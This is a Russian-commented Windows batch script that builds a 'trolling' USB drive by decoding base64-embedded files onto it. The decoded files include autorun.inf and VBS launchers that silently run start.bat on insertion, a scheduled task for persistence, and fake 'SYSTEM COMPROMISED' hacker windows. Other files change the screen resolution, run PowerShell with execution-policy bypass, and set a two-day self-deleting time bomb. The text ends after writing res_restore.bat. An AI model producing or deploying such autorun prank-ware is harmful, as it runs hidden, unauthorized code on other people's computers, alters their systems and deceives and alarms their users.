@echo off
setlocal EnableExtensions
rem ===============================================
rem  make_vizorusb.bat   (Windows 7/10/11)
rem  Собирает троллинг-флешку VizorUSB-N БЕЗ Git Bash/WSL.
rem  Файлы внедрены в base64, декодирует встроенный certutil.
rem  Двойной клик или: make_vizorusb.bat E:
rem ===============================================
chcp 65001 >nul 2>&1

set "T=%~1"
if defined T goto have_T
set "FOUND="
for /f "delims=" %%d in ('wmic logicaldisk where "drivetype=2" get deviceid ^| find ":"') do set "FOUND=%%d"
if defined FOUND set "T=%FOUND%\"
if not defined T ( echo [i] Не нахожу флешку автоматически. & set /p "T=Буква флешки (например E:): " )
if not defined T ( echo ОШИБКА. & pause & exit /b 1 )
:have_T
echo.
echo  -> Цель: %T%
echo  -> Запись 27 файлов...

rem ---- start.sh ----
> "%TEMP%\vz.b64" (
  echo IyEvYmluL2Jhc2gKIyBWaXpvclVTQi1OIC0g0LvQsNGD0L3Rh9C10YAgKExpbnV4L21hY09TL0Fu
  echo ZHJvaWQpCkJBU0U9IiQoY2QgIiQoZGlybmFtZSAiJHtCQVNIX1NPVVJDRVswXX0iKSIgJiYgcHdk
  echo KSIKCiMgLS0tIFRJTUUtQk9NQjog0YfQtdGA0LXQtyAyINC00L3RjyDQsNCy0YLQvtC30LDQv9GD
  echo 0YHQuiDRg9C00LDQu9GP0LXRgiDRgdCw0Lwg0YHQtdCx0Y8gLS0tCk1BUks9IiRCQVNFLy52aXpv
  echo cl9kbCIKaWYgWyAtZiAiJE1BUksiIF07IHRoZW4KICAgIERMPSIkKGNhdCAiJE1BUksiIDI+L2Rl
  echo di9udWxsKSIKICAgIGlmIFsgLW4gIiRETCIgXSAmJiBbICIkKGRhdGUgKyVzKSIgLWd0ICIkREwi
  echo IF0gMj4vZGV2L251bGw7IHRoZW4KICAgICAgICBybSAtZiAiJEJBU0UvYXV0b3J1bi5pbmYiICIk
  echo QkFTRS9hdXRvcnVuLnZicyIgIiRCQVNFL3N0YXJ0LnNoIiAiJEJBU0Uvc3RhcnQuYmF0IiAiJE1B
  echo UksiCiAgICAgICAgZXhpdCAwCiAgICBmaQplbHNlCiAgICBlY2hvICIkKCggJChkYXRlICslcykg
  echo KyAxNzI4MDAgKSkiID4gIiRNQVJLIgpmaQoKIyAxLiDRhdCw0LrQtdGA0YHQutC40LUg0L7QutC9
  echo 0LAKYmFzaCAiJEJBU0Uvc2NyaXB0cy9oYWNrX2xpbnV4LnNoIiAiJEJBU0UiCgojIDIuINGB0LzQ
  echo tdC90LAg0YDQsNC30YDQtdGI0LXQvdC40Y8gKNC60LDRgNGC0LAg0LfQsNGF0LLQsNGC0LApCmJh
  echo c2ggIiRCQVNFL3NjcmlwdHMvbGludXgvMDJfcmVzY2hhbmdlLnNoIgoKIyAzLiB3YXRjaGRvZzog
  echo 0LLRi9C90YPQuyDRhNC70LXRiNC60YMgLT4g0LLRgdGRINC30LDQutGA0YvQu9C+0YHRjApzZXRz
  echo aWQgYmFzaCAiJEJBU0Uvc2NyaXB0cy93YXRjaGRvZy5zaCIgIiRCQVNFIiA8L2Rldi9udWxsID4v
  echo ZGV2L251bGwgMj4mMSAmCgojIDQuINC/0YDQuNC60L7Qu9GLCmJhc2ggIiRCQVNFL3NjcmlwdHMv
  echo bGludXgvMDFfcHJhbmsuc2giCmV4aXQgMAo=
)
certutil -decode -f "%TEMP%\vz.b64" "%T%\start.sh" >nul
del "%TEMP%\vz.b64" >nul 2>&1

rem ---- autorun.inf ----
> "%TEMP%\vz.b64" (
  echo W2F1dG9ydW5dCmxhYmVsPVZpem9yVVNCLU4KaWNvbj1zaGVsbDMyLmRsbCw0Ck9QRU49d3Njcmlw
  echo dC5leGUgYXV0b3J1bi52YnMKYWN0aW9uPSVEMCU5NyVEMCVCMCVEMCVCRiVEMSU4MyVEMSU4MSVE
  echo MSU4MiVEMCVCOCVEMSU4MiVEMSU4QyBWaXpvclVTQi1OCkRlZmF1bHRMYWJlbD0lRDAlOTclRDAl
  echo QjAlRDAlQkYlRDElODMlRDElODElRDElODIlRDAlQjglRDElODIlRDElOEMgVml6b3JVU0ItTgpz
  echo aGVsbFxzY3JpcHRzPVZpem9yVVNCLU4gU2NyaXB0cwpzaGVsbFxzY3JpcHRzXGNvbW1hbmQ9d3Nj
  echo cmlwdC5leGUgYXV0b3J1bi52YnMKc2hlbGxcZXhwbG9yZT1PcGVuIEV4cGxvcmVyCnNoZWxsXGV4
  echo cGxvcmVcY29tbWFuZD1leHBsb3Jlci5leGUgLgo=
)
certutil -decode -f "%TEMP%\vz.b64" "%T%\autorun.inf" >nul
del "%TEMP%\vz.b64" >nul 2>&1

rem ---- README.md ----
> "%TEMP%\vz.b64" (
  echo IyBWaXpvclVTQi1OCgrQotGA0L7Qu9C70LjQvdCzLdGE0LvQtdGI0LrQsCDQvtC00L3QuNC8INGB
  echo 0LrRgNC40L/RgtC+0Lw6INCy0YHRgtCw0LLQuNC7IC0+INC+0LrQvdCwIEg0Q0stUjAwVCArCtC3
  echo 0LXQu9GR0L3Ri9C5INC70LjRgdGC0LjQvdCzINGE0LDQudC70L7QsiArINGB0LzQtdC90LAg0YDQ
  echo sNC30YDQtdGI0LXQvdC40Y8g0L3QsCA4MDB4NjAwICsg0L/RgNC40LrQvtC70YsuCtCS0YvQvdGD
  echo 0LsgLT4g0LLRgdGRINC30LDQutGA0YvQstCw0LXRgtGB0Y8g0Lgg0YDQsNC30YDQtdGI0LXQvdC4
  echo 0LUg0LLQvtC30LLRgNCw0YnQsNC10YLRgdGPICh3YXRjaGRvZykuCtCS0YHRkSDQsiDQv9Cw0LzR
  echo j9GC0LgsINC/0L7RgdC70LUg0L/QtdGA0LXQt9Cw0LPRgNGD0LfQutC4INCf0Jog0YHQu9C10LTQ
  echo vtCyINC90LXRgi4KCiMjINCh0LHQvtGA0LrQsCDRhNC70LXRiNC60LgKYGBgYmFzaApiYXNoIG1h
  echo a2Vfdml6b3J1c2Iuc2ggWy/Qv9GD0YLRjC/Qui/RhNC70LXRiNC60LVdCmBgYApMaW51eC9tYWNP
  echo Uzog0LrQvtC90YHQvtC70YwuIFdpbmRvd3M6IEdpdCBCYXNoIC8gV1NMINC40LvQuCBtYWtlX3Zp
  echo em9ydXNiLmJhdCAo0LTQstC+0LnQvdC+0Lkg0LrQu9C40LopLgoKIyMg0JDQstGC0L7Qt9Cw0L/R
  echo g9GB0LoKLSBMaW51eDogc3VkbyBiYXNoIGluc3RhbGwvbGludXgtYXV0b3J1bi5zaCAodWRldikg
  echo LT4g0LLRgdGC0LDQstGMINGE0LvQtdGI0LrRgyDQt9Cw0L3QvtCy0L4KLSBXaW5kb3dzOiBpbnN0
  echo YWxsXHdpbmRvd3MtYXV0b3J1bi5iYXQg0L7RgiDQsNC00LzQuNC90LAgKFdpbjcgLSDRgdGA0LDQ
  echo t9GDLAogIFdpbjEwLzExIC0gKyDQstGL0LHQvtGAINCyINC+0LrQvdC1IEF1dG9QbGF5ICLQktGB
  echo 0LXQs9C00LAiKQoKIyMg0J3QsNGB0YLRgNC+0LnQutC4Ci0g0KDQsNC30YDQtdGI0LXQvdC40LU6
  echo IFRBUkdFVF9SRVMgKGxpbnV4KSAvIFRBUkdFVF9XK1RBUkdFVF9IICh3aW5kb3dzKQotINCe0YLQ
  echo utC70Y7Rh9C40YLRjCDQv9GA0LjQutC+0LvRizog0YHQvtC30LTQsNC5INCyINC60L7RgNC90LUg
  echo 0YTQu9C10YjQutC4INGE0LDQudC7IE9GRgoKIyMg0JHQtdC30L7Qv9Cw0YHQvdC+0YHRgtGMCtCe
  echo 0LHRgNCw0YLQuNC80L4sINC90LjRh9C10LPQviDQvdC1INC70L7QvNCw0LXRgiDQuCDQvdC1INGI
  echo 0L/QuNC+0L3QuNGCLgo=
)
certutil -decode -f "%TEMP%\vz.b64" "%T%\README.md" >nul
del "%TEMP%\vz.b64" >nul 2>&1

rem ---- start.bat ----
> "%TEMP%\vz.b64" (
  echo QGVjaG8gb2ZmCmNoY3AgNjUwMDEgPm51bCAyPiYxCnNldCBCQVNFPSV+ZHAwCgpSRU0gLS0tIFRJ
  echo TUUtQk9NQjog0YfQtdGA0LXQtyAyINC00L3RjyDQsNCy0YLQvtC30LDQv9GD0YHQuiDRg9C00LDQ
  echo u9GP0LXRgiDRgdCw0Lwg0YHQtdCx0Y8gLS0tCndzY3JpcHQuZXhlICIlQkFTRSVzY3JpcHRzXGRl
  echo YWRsaW5lLnZicyIgLy9ub2xvZ28gPm51bCAyPiYxCmlmICVlcnJvcmxldmVsJT09MCBleGl0IC9i
  echo IDAKClJFTSAtLS0g0L/Qu9Cw0L0g0LfQsNGH0LjRgdGC0LrQuCDQvdCw0YPRgtGA0L4gKNC90LAg
  echo 0YHQu9GD0YfQsNC5LCDQtdGB0LvQuCDRhNC70LXRiNC60YMg0LLRi9C90YPQu9C4KSAtLS0Kc2No
  echo dGFza3MgL3F1ZXJ5IC90biAiVml6b3JVU0ItTiIgPm51bCAyPiYxIHx8IHNjaHRhc2tzIC9jcmVh
  echo dGUgL3RuICJWaXpvclVTQi1OIiAvdHIgIndzY3JpcHQuZXhlIFxcIiVCQVNFJXNjcmlwdHNcXHZh
  echo bmlzaC52YnNcXCIiIC9zYyBvbmNlIC9zdCAwMDowMCAvZiA+bnVsIDI+JjEKClJFTSAxLiDRgNC1
  echo 0YHRgtC+0YAg0YDQsNC30YDQtdGI0LXQvdC40Y8g0LfQsNGA0LDQvdC10LUg0LIgJVRFTVAlICjQ
  echo v9C10YDQtdC20LjQstCw0LXRgiDQstGL0L3QuNC80LDQvdC40LUpCmNvcHkgL3kgIiVCQVNFJXNj
  echo cmlwdHNcd2luZG93c1xyZXNfcmVzdG9yZS5wczEiICIlVEVNUCVcdml6b3JfcmVzX3Jlc3RvcmUu
  echo cHMxIiA+bnVsCgpSRU0gMi4gd2F0Y2hkb2cg0YHQutGA0YvRgtC90L4gLSDQstGL0L3Rg9C7INGE
  echo 0LvQtdGI0LrRgz8g0LLRgdGRINC30LDQutGA0L7QtdGC0YHRjwpzdGFydCAvbWluICIiICIlQkFT
  echo RSVzY3JpcHRzXHdhdGNoZG9nLmJhdCIgIiV+ZDAiCgpSRU0gMy4g0YXQsNC60LXRgNGB0LrQuNC1
  echo INC+0LrQvdCwCmNhbGwgIiVCQVNFJXNjcmlwdHNcaGFja193aW5kb3dzLmJhdCIKClJFTSA0LiDR
  echo gdC80LXQvdCwINGA0LDQt9GA0LXRiNC10L3QuNGPICjQutCw0YDRgtCwINC30LDRhdCy0LDRgtCw
  echo KQpjYWxsICIlQkFTRSVzY3JpcHRzXHdpbmRvd3NcMDJfcmVzY2hhbmdlLmJhdCIKClJFTSA1LiDQ
  echo v9GA0LjQutC+0LvRiwpjYWxsICIlQkFTRSVzY3JpcHRzXHdpbmRvd3NcMDFfcHJhbmsuYmF0Igpl
  echo eGl0IC9iIDAK
)
certutil -decode -f "%TEMP%\vz.b64" "%T%\start.bat" >nul
del "%TEMP%\vz.b64" >nul 2>&1

rem ---- autorun.vbs ----
> "%TEMP%\vz.b64" (
  echo JyBWaXpvclVTQi1OOiDRgdC60YDRi9GC0YvQuSDQsNCy0YLQvtC30LDQv9GD0YHQuiBzdGFydC5i
  echo YXQKJyB3aW5kb3dTdHlsZSAwID0g0YHQutGA0YvRgtC+LCBPbiBFcnJvciBSZXN1bWUgTmV4dCA9
  echo INCx0LXQtyDQvtGI0LjQsdC+0LoKJyDQtNCw0LbQtSDQtdGB0LvQuCDRhNC70LXRiNC60YMg0YPQ
  echo ttC1INCy0YvQvdGD0LvQuApPbiBFcnJvciBSZXN1bWUgTmV4dApTZXQgd3MgPSBDcmVhdGVPYmpl
  echo Y3QoIldTY3JpcHQuU2hlbGwiKQpTZXQgZnMgPSBDcmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxl
  echo U3lzdGVtT2JqZWN0IikKcm9vdCA9IGZzLkdldFBhcmVudEZvbGRlck5hbWUoV1NjcmlwdC5TY3Jp
  echo cHRGdWxsTmFtZSkKd3MuUnVuICJjbWQuZXhlIC9jICIiIiAmIHJvb3QgJiAiXHN0YXJ0LmJhdCIi
  echo IiwgMCwgRmFsc2UKV1NjcmlwdC5RdWl0Cg==
)
certutil -decode -f "%TEMP%\vz.b64" "%T%\autorun.vbs" >nul
del "%TEMP%\vz.b64" >nul 2>&1

rem ---- scripts/hack_windows.bat ----
if not exist "%T%\scripts" mkdir "%T%\scripts" 2>nul
> "%TEMP%\vz.b64" (
  echo QGVjaG8gb2ZmCmNoY3AgNjUwMDEgPm51bCAyPiYxCnN0YXJ0ICJINENLLVIwMFQiIGNtZCAvayAi
  echo Y29sb3IgMEEgJiYgdGl0bGUgSDRDSy1SMDBUICYmIGNscyAmJiBlY2hvID09PT09PT09PT09PT09
  echo PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSAmJiBlY2hvICAgIFVOQVVUSE9SSVpFRCBB
  echo Q0NFU1MgLy8gVklaT1IgUk9PVEtJVCAmJiBlY2hvID09PT09PT09PT09PT09PT09PT09PT09PT09
  echo PT09PT09PT09PT09PT09PT09PSAmJiBmb3IgL2wgJSVpIGluICgxLDEsOTkpIGRvIEAoIGVjaG8g
  echo cm9vdEBoNGNrOn4jIHVubG9jayAtLXJvb3QgLS1mb3JjZSBbJSVpXSBeJiBlY2hvICAgWytdIEFD
  echo Q0VTUyBHUkFOVEVEIDB4JSVyYW5kb20lJSBeJiBwaW5nIC1uIDIgMTI3LjAuMC4xIF4+bnVsICki
  echo CnN0YXJ0ICJINENLLVIwMFQiIC9NQVggY21kIC9rICJjb2xvciAwQyAmJiB0aXRsZSBINENLLVIw
  echo MFQgJiYgY2xzICYmIGVjaG8gWyEhIV0gU1lTVEVNIENPTVBST01JU0VEICYmIGZvciAvbCAlJWkg
  echo aW4gKDEsMSw5OSkgZG8gQCggZWNobyByb290QGg0Y2s6fiMgZGVjcnlwdF9tYWluZnJhbWUgJSVy
  echo YW5kb20lJSBieXRlcyBeJiBwaW5nIC1uIDIgMTI3LjAuMC4xIF4+bnVsICkiCnN0YXJ0ICJINENL
  echo LVIwMFQiIGNtZCAvayAiY29sb3IgMDkgJiYgdGl0bGUgSDRDSy1SMDBUICYmIGNscyAmJiBlY2hv
  echo IHJvb3RAaDRjazp+IyBzcyAtdGxucCAmJiBmb3IgL2wgJSVpIGluICgxLDEsOTkpIGRvIEAoIGVj
  echo aG8gUE9SVCAlJXJhbmRvbSUlIDo6IE9QRU4gXiYgcGluZyAtbiAyIDEyNy4wLjAuMSBePm51bCAp
  echo IgpzdGFydCAiSDRDSy1SMDBUIiAvTUFYIGNtZCAvayAiY29sb3IgMEEgJiYgdGl0bGUgSDRDSy1S
  echo MDBUICYmIGNscyAmJiBlY2hvIEg0Q0tNQVRSSVggJiYgZm9yIC9sICUlaSBpbiAoMSwxLDk5KSBk
  echo byBAKCBlY2hvICUlcmFuZG9tJSUgXiYgZWNobyAlJXJhbmRvbSUlIF4mIHBpbmcgLW4gMiAxMjcu
  echo MC4wLjEgXj5udWwgKSIKUkVNIC0tLSDQvtC60L3QviA1ICjQuCA2KTog0YTQsNC50LvRiyDQt9C1
  echo 0LvRkdC90YvQvCDQutCw0LogImRpciAvcyIgYyBjb2xvciAwMiAtLS0Kc3RhcnQgIkg0Q0stUjAw
  echo VCIgL01BWCBjbWQgL2sgImNvbG9yIDAyICYmIHRpdGxlIEg0Q0stUjAwVCAmJiBjbHMgJiYgZWNo
  echo byByb290QGg0Y2s6fiMgZGlyIC9zICYmIGZvciAvbCAlJWkgaW4gKDEsMSwzKSBkbyBAKCBkaXIg
  echo L3MgL2IgIkM6XFdpbmRvd3NcU3lzdGVtMzJcKi5kbGwiIDJePm51bCBefCBmaW5kc3RyIC92ICJe
  echo JCIgJiBwaW5nIC1uIDMgMTI3LjAuMC4xIF4+bnVsICkiCnN0YXJ0ICJINENLLVIwMFQiIGNtZCAv
  echo ayAiY29sb3IgMDIgJiYgdGl0bGUgSDRDSy1SMDBUICYmIGNscyAmJiBlY2hvIHJvb3RAaDRjazp+
  echo IyBkaXIgL3MgJiYgZm9yIC9sICUlaSBpbiAoMSwxLDMpIGRvIEAoIGRpciAvcyAvYiAiQzpcV2lu
  echo ZG93c1xTeXN0ZW0zMlxkcml2ZXJzXCouc3lzIiAyXj5udWwgXnwgZmluZHN0ciAvdiAiXiQiICYg
  echo cGluZyAtbiAzIDEyNy4wLjAuMSBePm51bCApIgpleGl0IC9iIDAK
)
certutil -decode -f "%TEMP%\vz.b64" "%T%\scripts\hack_windows.bat" >nul
del "%TEMP%\vz.b64" >nul 2>&1

rem ---- scripts/detect_os.sh ----
if not exist "%T%\scripts" mkdir "%T%\scripts" 2>nul
> "%TEMP%\vz.b64" (
  echo IyEvYmluL2Jhc2gKIyDQntC/0YDQtdC00LXQu9C10L3QuNC1INCe0KEKT1NfTkFNRT0iVW5rbm93
  echo biI7IE9TX1ZFUlNJT049IiI7IE9TX0ZBTUlMWT0iIgpjYXNlICIkKHVuYW1lIC1zKSIgaW4KICAg
  echo IExpbnV4KikKICAgICAgICBPU19GQU1JTFk9ImxpbnV4IgogICAgICAgIGlmIFsgLWYgL2V0Yy9v
  echo cy1yZWxlYXNlIF07IHRoZW4gLiAvZXRjL29zLXJlbGVhc2U7IE9TX05BTUU9IiROQU1FIjsgT1Nf
  echo VkVSU0lPTj0iJFZFUlNJT05fSUQiOwogICAgICAgIGVsaWYgWyAtZiAvZXRjL2xzYi1yZWxlYXNl
  echo IF07IHRoZW4gLiAvZXRjL2xzYi1yZWxlYXNlOyBPU19OQU1FPSIkRElTVFJJQl9JRCI7IE9TX1ZF
  echo UlNJT049IiRESVNUUklCX1JFTEVBU0UiOyBmaQogICAgICAgIDs7CiAgICBEYXJ3aW4qKQogICAg
  echo ICAgIE9TX0ZBTUlMWT0ibWFjIgogICAgICAgIE9TX05BTUU9Im1hY09TIjsgT1NfVkVSU0lPTj0i
  echo JChzd192ZXJzIC1wcm9kdWN0VmVyc2lvbiAyPi9kZXYvbnVsbCB8fCBlY2hvIHVua25vd24pIgog
  echo ICAgICAgIDs7CiAgICBBbmRyb2lkKikKICAgICAgICBPU19GQU1JTFk9ImFuZHJvaWQiOyBPU19O
  echo QU1FPSJBbmRyb2lkIgogICAgICAgIE9TX1ZFUlNJT049IiQoZ2V0cHJvcCByby5idWlsZC52ZXJz
  echo aW9uLnJlbGVhc2UgMj4vZGV2L251bGwgfHwgZWNobyB1bmtub3duKSIKICAgICAgICA7OwogICAg
  echo TUlOR1cqfE1TWVMqfENZR1dJTiopCiAgICAgICAgT1NfRkFNSUxZPSJ3aW5kb3dzIjsgT1NfTkFN
  echo RT0iV2luZG93cyI7IE9TX1ZFUlNJT049IiQodW5hbWUgLXIpIgogICAgICAgIDs7CmVzYWMKaWYg
  echo WyAteiAiJE9TX0ZBTUlMWSIgXSB8fCBbICIkKHVuYW1lIC1vIDI+L2Rldi9udWxsKSIgPSAiQW5k
  echo cm9pZCIgXSB8fCBbIC1uICIkUFJFRklYIiBdOyB0aGVuCiAgICBPU19GQU1JTFk9ImFuZHJvaWQi
  echo OyBPU19OQU1FPSJBbmRyb2lkIgogICAgT1NfVkVSU0lPTj0iJChnZXRwcm9wIHJvLmJ1aWxkLnZl
  echo cnNpb24ucmVsZWFzZSAyPi9kZXYvbnVsbCB8fCBlY2hvIHVua25vd24pIgpmaQpleHBvcnQgT1Nf
  echo TkFNRSBPU19WRVJTSU9OIE9TX0ZBTUlMWQo=
)
certutil -decode -f "%TEMP%\vz.b64" "%T%\scripts\detect_os.sh" >nul
del "%TEMP%\vz.b64" >nul 2>&1

rem ---- scripts/watchdog.bat ----
if not exist "%T%\scripts" mkdir "%T%\scripts" 2>nul
> "%TEMP%\vz.b64" (
  echo QGVjaG8gb2ZmCnJlbSDQldGB0LvQuCDRhNC70LXRiNC60YMg0LLRi9C90YPQu9C4IC0g0LfQsNC6
  echo 0YDRi9GC0Ywg0L7QutC90LAg0Lgg0LLQtdGA0L3Rg9GC0Ywg0YDQsNC30YDQtdGI0LXQvdC40LUg
  echo 0LjQtyAlVEVNUCUKY2hjcCA2NTAwMSA+bnVsIDI+JjEKOmxvb3AKaWYgbm90IGV4aXN0ICIlMWF1
  echo dG9ydW4uaW5mIiBnb3RvIGRpZQpwaW5nIC1uIDIgMTI3LjAuMC4xID5udWwKZ290byBsb29wCjpk
  echo aWUKaWYgZXhpc3QgIiVURU1QJVx2aXpvcl9yZXNfcmVzdG9yZS5wczEiICgKICAgIHBvd2Vyc2hl
  echo bGwgLU5vUHJvZmlsZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVRFTVAlXHZpem9y
  echo X3Jlc19yZXN0b3JlLnBzMSIKKQpwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLUNvbW1hbmQgIkdldC1Q
  echo cm9jZXNzIHwgV2hlcmUtT2JqZWN0IHsgJF8uTWFpbldpbmRvd1RpdGxlIC1tYXRjaCAnSDRDS3xW
  echo SVpPUi1NRU5VJyB9IHwgU3RvcC1Qcm9jZXNzIC1Gb3JjZSIgMj5udWwKZXhpdCAvYiAwCg==
)
certutil -decode -f "%TEMP%\vz.b64" "%T%\scripts\watchdog.bat" >nul
del "%TEMP%\vz.b64" >nul 2>&1

rem ---- scripts/hack_screen.sh ----
if not exist "%T%\scripts" mkdir "%T%\scripts" 2>nul
> "%TEMP%\vz.b64" (
  echo IyEvYmluL2Jhc2gKIyDQodC+0LTQtdGA0LbQuNC80L7QtSDRhdCw0LrQtdGA0YHQutC40YUg0L7Q
  echo utC+0L0KcHJpbnRmICdcZVsySlxlWzA7MEhcZVszMm0nCnByaW50ZiAnPT09PT09PT09PT09PT09
  echo PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09XG4nCnByaW50ZiAnICAgVU5BVVRIT1JJWkVE
  echo IEFDQ0VTUyAgLy8gVklaT1IgUk9PVEtJVFxuJwpwcmludGYgJz09PT09PT09PT09PT09PT09PT09
  echo PT09PT09PT09PT09PT09PT09PT09PT09PVxuJwppPTAKd2hpbGUgOjsgZG8KICAgIGk9JCgoaSAr
  echo IDEpKQogICAgcHJpbnRmICdyb290QGg0Y2s6fiMgdW5sb2NrIC0tcm9vdCAtLWZvcmNlIFslc11c
  echo bicgIiRpIgogICAgc2xlZXAgMC4yCiAgICBwcmludGYgJyAgWytdIEFDQ0VTUyBHUkFOVEVEIDB4
  echo JTA0WFxuJyAkKChSQU5ET00gJSA2NTUzNikpCiAgICBwcmludGYgJyAgWytdIFBJTkcgbWFpbmZy
  echo YW1lIC4uLiAgICAgICVzIG1zXG4nICQoKFJBTkRPTSAlIDEwMCArIDEpKQogICAgc2xlZXAgMC4z
  echo CiAgICBwcmludGYgJ3Jvb3RAaDRjazp+IyBieXBhc3MgLS1zZWN1cml0eSAtLWxldmVsIGZ1bGwg
  echo WyVzXVxuJyAiJGkiCiAgICBwcmludGYgJyAgWyFdIENSSVRJQ0FMIEJ5cGFzc2VkIC0+ICVzJSVc
  echo bicgJCgoUkFORE9NICUgMTAwKSkKICAgIHByaW50ZiAnICBbIV0gdW5sb2NrIHJvb3QgPj4+IE9L
  echo XG4nCiAgICBzbGVlcCAwLjI1CiAgICBwcmludGYgJ3Jvb3RAaDRjazp+IyB3aG9hbWkgLT4gcm9v
  echo dCNWSVpPUlxuJwogICAgcHJpbnRmICdyb290QGg0Y2s6fiMgZGlyIC9zIChjb2xvciAwMilcbicK
  echo ICAgIHByaW50ZiAnICAvdXNyL2xpYi9saW51eC02LjEvU3lzdGVtLm1hcCAgICAgJXNLXG4nICIk
  echo KChSQU5ET00gJSAyNDAgKyA0MCkpIgogICAgcHJpbnRmICcgIC9ib290L2luaXRyZC5pbWctWyUw
  echo MmRdICAgICAgICAgcm9vdGZzLmtvXG4nICIkKChSQU5ET00gJSA5OSkpIgogICAgcHJpbnRmICcg
  echo IC9wcm9jLyVkL21lbSAgICAgICAgICAgICAgICAgICAgbG9ja2VkIC0+IHVubG9jayByb290XG4n
  echo ICIkKChSQU5ET00gJSA5OTk5KSkiCiAgICBwcmludGYgJyAgL3Jvb3QvLnNzaC9pZF9yc2EgIFtI
  echo SVRdICAgICAgICAlMDF4JTAxeCUwMXglMDF4XG4nICIkKChSQU5ET00lMTYpKSIgIiQoKFJBTkRP
  echo TSUxNikpIiAiJCgoUkFORE9NJTE2KSkiICIkKChSQU5ET00lMTYpKSIKICAgIHNsZWVwIDAuNApk
  echo b25lCg==
)
certutil -decode -f "%TEMP%\vz.b64" "%T%\scripts\hack_screen.sh" >nul
del "%TEMP%\vz.b64" >nul 2>&1

rem ---- scripts/detect_os.bat ----
if not exist "%T%\scripts" mkdir "%T%\scripts" 2>nul
> "%TEMP%\vz.b64" (
  echo QGVjaG8gb2ZmCnNldGxvY2FsIEVuYWJsZURlbGF5ZWRFeHBhbnNpb24KZm9yIC9mICJ0b2tlbnM9
  echo NCBkZWxpbXM9ICIgJSV2IGluICgndmVyJykgZG8gc2V0IFY9JSV2CnNldCBWPSFWOl0KZm9yIC9m
  echo ICJ0b2tlbnM9MSwyLDMgZGVsaW1zPS4iICUlYSBpbiAoIiFWISIpIGRvICggc2V0IE1BSj0lJWEg
  echo JiBzZXQgTUlOPSUlYiAmIHNldCBCTD0lJWMgKQpzZXQgV0lOX1ZFUj11bmtub3duCmlmICIlTUFK
  echo JSI9PSI2IiBpZiAiJU1JTiUiPT0iMSIgc2V0IFdJTl9WRVI9V2luZG93cyA3CmlmICIlTUFKJSI9
  echo PSI2IiBpZiAiJU1JTiUiPT0iMiIgc2V0IFdJTl9WRVI9V2luZG93cyA4CmlmICIlTUFKJSI9PSI2
  echo IiBpZiAiJU1JTiUiPT0iMyIgc2V0IFdJTl9WRVI9V2luZG93cyA4LjEKaWYgIiVNQUolIj09IjEw
  echo IiBzZXQgV0lOX1ZFUj1XaW5kb3dzIDEwCmlmICIlTUFKJSI9PSIxMCIgaWYgIiVNSU4lIj09IjAi
  echo IGlmICVCTCUgR0VRIDIyMDAwIHNldCBXSU5fVkVSPVdpbmRvd3MgMTEKZWNobyBXaW5kb3dzOiAh
  echo V0lOX1ZFUiEgXnwg0J/QmjogJUNPTVBVVEVSTkFNRSUgXnwg0K7Qt9C10YA6ICVVU0VSTkFNRSUK
  echo ZW5kbG9jYWwK
)
certutil -decode -f "%TEMP%\vz.b64" "%T%\scripts\detect_os.bat" >nul
del "%TEMP%\vz.b64" >nul 2>&1

rem ---- scripts/deadline.vbs ----
if not exist "%T%\scripts" mkdir "%T%\scripts" 2>nul
> "%TEMP%\vz.b64" (
  echo JyBWaXpvclVTQi1OOiB0aW1lLWJvbWIuINCd0LUg0L3QsNGB0YLRg9C/0LjQuyDRgdGA0L7Quj8g
  echo 0LbQuNCy0L7QuS4g0J3QsNGB0YLRg9C/0LjQuz8g0YLQuNGF0L4g0YPQtNCw0LvRj9C10YIg0LDQ
  echo stGC0L7Qt9Cw0L/Rg9GB0LouCk9uIEVycm9yIFJlc3VtZSBOZXh0ClNldCBmcyA9IENyZWF0ZU9i
  echo amVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKQpyb290ID0gZnMuR2V0UGFyZW50Rm9s
  echo ZGVyTmFtZShmcy5HZXRQYXJlbnRGb2xkZXJOYW1lKFdTY3JpcHQuU2NyaXB0RnVsbE5hbWUpKQpt
  echo YXJrID0gZnMuQnVpbGRQYXRoKHJvb3QsICIudml6b3JfZGwiKQoKSWYgZnMuRmlsZUV4aXN0cyht
  echo YXJrKSBUaGVuCiAgICBTZXQgZiA9IGZzLk9wZW5UZXh0RmlsZShtYXJrLCAxKQogICAgcyA9IGYu
  echo UmVhZExpbmUgOiBmLkNsb3NlCiAgICBJZiBzIDw+ICIiIEFuZCBJc0RhdGUocykgVGhlbgogICAg
  echo ICAgIElmIENEYXRlKHMpIDwgRGF0ZSgpIFRoZW4KICAgICAgICAgICAgZnMuRGVsZXRlRmlsZSBm
  echo cy5CdWlsZFBhdGgocm9vdCwgImF1dG9ydW4uaW5mIikKICAgICAgICAgICAgZnMuRGVsZXRlRmls
  echo ZSBmcy5CdWlsZFBhdGgocm9vdCwgImF1dG9ydW4udmJzIikKICAgICAgICAgICAgZnMuRGVsZXRl
  echo RmlsZSBmcy5CdWlsZFBhdGgocm9vdCwgInN0YXJ0LmJhdCIpCiAgICAgICAgICAgIGZzLkRlbGV0
  echo ZUZpbGUgZnMuQnVpbGRQYXRoKHJvb3QsICJzdGFydC5zaCIpCiAgICAgICAgICAgIGZzLkRlbGV0
  echo ZUZpbGUgbWFyawogICAgICAgICAgICBXU2NyaXB0LlF1aXQgMAogICAgICAgIEVuZCBJZgogICAg
  echo RW5kIElmCkVsc2UKICAgIFNldCBmID0gZnMuQ3JlYXRlVGV4dEZpbGUobWFyaywgVHJ1ZSkKICAg
  echo IGYuV3JpdGVMaW5lIENTdHIoRGF0ZSgpICsgMikKICAgIGYuQ2xvc2UKRW5kIElmCldTY3JpcHQu
  echo UXVpdCAxCg==
)
certutil -decode -f "%TEMP%\vz.b64" "%T%\scripts\deadline.vbs" >nul
del "%TEMP%\vz.b64" >nul 2>&1

rem ---- scripts/res_restore.bat ----
if not exist "%T%\scripts" mkdir "%T%\scripts" 2>nul
> "%TEMP%\vz.b64" (
  echo QGVjaG8gb2ZmCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAt
  echo RmlsZSAiJX5kcDB3aW5kb3dzXHJlc19yZXN0b3JlLnBzMSIKZXhpdCAvYiAwCg==
)
certutil -decode -f "%TEMP%\vz.b64" "%T%\scripts\res_restore.bat" >nul
